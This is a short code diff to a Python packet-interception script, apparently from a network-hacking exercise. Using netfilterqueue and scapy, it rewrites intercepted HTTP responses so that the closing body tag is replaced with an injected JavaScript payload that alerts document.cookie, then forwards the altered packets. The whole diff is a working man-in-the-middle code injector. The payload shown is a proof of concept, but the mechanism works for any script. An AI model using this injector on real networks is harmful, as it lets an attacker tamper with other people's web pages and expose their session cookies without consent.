@@ -4,6 +4,8 @@ import netfilterqueue
 import scapy.all as scapy
 import re
 
+injected_payload = "<script>alert(document.cookie);</script></body>"
+
 def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
@@ -23,7 +25,9 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", injected_payload)
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
